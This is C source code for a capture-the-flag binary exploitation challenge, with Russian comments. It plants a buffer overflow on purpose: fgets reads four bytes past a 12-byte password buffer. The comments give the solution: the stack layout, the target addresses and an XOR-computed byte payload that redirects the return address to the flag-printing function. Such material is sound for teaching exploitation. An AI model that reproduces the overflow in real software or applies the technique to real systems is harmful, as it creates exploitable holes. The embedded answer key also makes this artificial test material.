#include <stdio.h>
#include <string.h>

// формат "len_login:login:crypted_login\n"
// считывает len_login, считывает len_login байт в login, и в crypted_login
// в pass считывает на 4 байта больше, это дает возможность переписать len_login
// делает цикличный xor login_crypted и pass

// решение:
// стэк: [12][4][16][16][8_align][4_ebp][return_addr]
// мы контролируем len_login, поэтому можем переписать например только 2 байта из return_addr
// тогда если
// print_flag = 0x0804858c
// ret_addr = 0x08048775
// print_flag ^ ret_addr = 0x2f9 = \xf9\x02\x00\x00
// то pass
// \xf9\x02\xf9\x02\xf9\x02\xf9\x02\xf9\x02\xf9\x02\x1e\x00\x00\x00

void print_flag() {
	char flag[32];
	FILE *hFile;

	hFile = fopen("flag", "r");
	fgets(flag, sizeof(flag), hFile);
	fclose(hFile);
	printf("Your flag is %s\n", flag);
}

void fread_db(unsigned int *len, char *login, char *login_crypted) {
	FILE *hFile;
	hFile = fopen("database.db", "r");
	fread(len, 1, 4, hFile);
	fread(login, 1, *len, hFile);
	login[*len] = 0;
	fread(login_crypted, 1, *len, hFile);
	login_crypted[*len] = 0;
	fclose(hFile);
}

void decrypt(char *buf, unsigned int len, char *key, unsigned int key_len) {
	for (unsigned int i = 0; i < len; ++i) {
		buf[i] ^= key[i % key_len];
	}
}

int check_auth() {
	char login[16];
	char login_crypted[16];
	unsigned int login_len;
	char pass[12];

	//printf("Print flag is on %08x\n", print_flag);
	//printf("Return addr is on %08x\n", __builtin_return_address(0));

	fread_db(&login_len, login, login_crypted);
	//printf("login_len = %08x\n", login_len, login_len);
	//printf("%s\n%s\n", login, login_crypted);

	printf("Enter password: ");
	fgets(pass, sizeof(pass) + 4, stdin);
	//printf("len = %08x, pass = %s\n", strlen(pass), pass);

	//printf("login_len = %08x (%d)\n", login_len, login_len);
	decrypt(login, login_len, pass, strlen(pass));
	return !strcmp(login, login_crypted);
}

int main() {
	if (check_auth()) {
		print_flag();
	} else {
		printf("Wrong username or password!");
	}
}